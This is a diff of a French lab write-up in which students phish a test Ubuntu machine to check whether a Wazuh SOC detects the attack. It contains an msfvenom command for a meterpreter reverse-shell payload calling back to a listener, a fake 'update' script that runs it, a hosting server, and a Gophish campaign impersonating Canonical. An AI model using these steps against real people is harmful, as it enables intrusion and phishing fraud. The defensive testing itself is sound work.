@@ -19,7 +19,7 @@ Les étapes de l'implémentation sont assez bien décrites, documentées et expl
 
 ## Déroulé de l'attaque
 
-Nous avons choisi d'effectuer une attque de phishing. Le but de l'attaque est de produire une payload revershell que nous allons zipper, et introduire le lien de téléchargement de la payload dans un mail. Mail dans lequel nous ne faisons passer pour l'entreprise Canonical demandant ainsi à un utilisateur de télécharger et de lancer le script dans le but de patcher une faille de sécurité recemment découverte. 
+Nous avons choisi d'effectuer une attque de phishing. Le but de l'attaque est de produire une payload revershell que nous allons zipper, et introduire le lien de téléchargement de la payload dans un mail. Mail dans lequel nous ne faisons passer pour l'entreprise Canonical demandant ainsi à un utilisateur de télécharger et de lancer le script dans le but de patcher une faille de sécurité recemment découverte.   
 
 Pour celà nous avons commencé par créer une campagne de phishing.  
 
@@ -30,21 +30,27 @@ mkdir update
 cd update
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.133.128 LPORT=6677 -f elf -o update.elf
 ```
-Ensuite nous créons un fichier `script.sh` dans le meme repertoire avec ceci dedans
+
+Ensuite nous créons un fichier `script.sh` dans le meme repertoire avec ceci dedans  
+
 ```
 !/bin/bash
 echo "Mise à jour en cours !!! Ne fermez pas cette fenêtre"
 ./update.elf
 ```
-On peut ensuite zipper le tout et créer un serveur HTTP accessible à la cible.
+
+On peut ensuite zipper le tout et créer un serveur HTTP accessible à la cible.  
+
 ```
 cd ..
 zip -r update/ update.zip
 python3 -m http.server 8888
 ```
 
-### 2 - Création d'une campagne de phishing
-#### a - Install de Gophish
+### 2 - Création d'une campagne de phishing  
+
+#### a - Install de Gophish  
+
 Ayant opté pour l'outil Gopgish, la première étape consiste à installe l'outil. 
 ```bash
 # Commande d'installation de Gophish
@@ -54,21 +60,24 @@ go build -o gophish ./...
 go build -o gophish
 mv gophish /usr/local/bin/
 ```
+
 Une fois installé, on peut le lancer en utilisant la commande `gophish` et se rendre à l'adresse `127.0.0.1:3333` de notre navigateur. Les identifiants de base sont affichés dans le terminal de lancement de la commande et une fois qu'on les a entrés il nous est demandé de choisir un nouveau mot de passe.  
 
-/// Image du dashbord de Gophish  
 
-#### b - Création d'un groupe
+![dashboard.png](dashboard.png)  
 
-/// Image du création du groupe   
+#### b - Création d'un groupe   
+   
+![new_group.png](new_group.png)  
 
 #### c - Création d'un sending profile  
 
-/// Image de création du sending profile   
+![sending_profile.png](sending_profile.png)  
 
 #### d - Création du mail template   
 
-/// Image de création du mail template
+
+![Template.png](Template.png)  
 
 Nous avons utilisé le code HTML suivant : 
 ```HTML
@@ -143,22 +152,23 @@ Ainsi on a un serveur local SMTP qui tourne sur `localhost:1025` et on peut acc�
 
 #### d - Lancement de la campagne de fishing  
 
-/// Image de création de la campagne
+![new_campaign.png](new_campaign.png)  
 
-/// Image du succès
+![result_first_campaign.png](result_first_campaign.png)  
 
-## Résultats
+## Résultats  
 Depuis notre machine Ubuntu qui représente l'agent Wazuh et donc ma cible, nous pouvons accéder à la boite mail via l'url http://192.168.133.128:8025 dans le navigateur.  
+
+![boite_mail.png](boite_mail.png)  
 
 Pour tester nos résultats nous avons configurés le SOC de sorte qu'il surveille de manière active le repertoire root, log toute modification et scan les fichiers ajoutés avec Virus Total. Si le fichier est considéré comme une menace alors il est supprimé. 
 
 ### 1 - Dans le repertoire Téléchargements   
 Une fois sur la machine Ubuntu, nous accédons à la boite mail, entrons dans le mail et téléchargeons le fichier fichier. Ainsi, nous suivont les actions mentionnées dans le mail. 
 
-/// Image de lancement de la payload   
-
-
-/// Image de reception de la connexion   
+![Lancement_shell.png](Lancement_shell.png)  
+ 
+![reception_shell.png](reception_shell.png)  
 
 
 ### 2 - Dans le repertoire /root
@@ -175,3 +185,12 @@ root@ubuntu-VMware-Virtual-Platform:/home/ubuntu/Téléchargements# cd /root/upd
 root@ubuntu-VMware-Virtual-Platform:~/update# ls
 script.sh
 ```
+On peut voir dans Wazuh que la modification du repertoire a été perçue et que la menace a été éliminée  
+
+![visuel_wazuh.png](visuel_wazuh.png)
+
+Si on upload la payload dans virus Total il la détecte comme étant malveillante  
+
+![virus_total.png](virus_total.png)
+
+
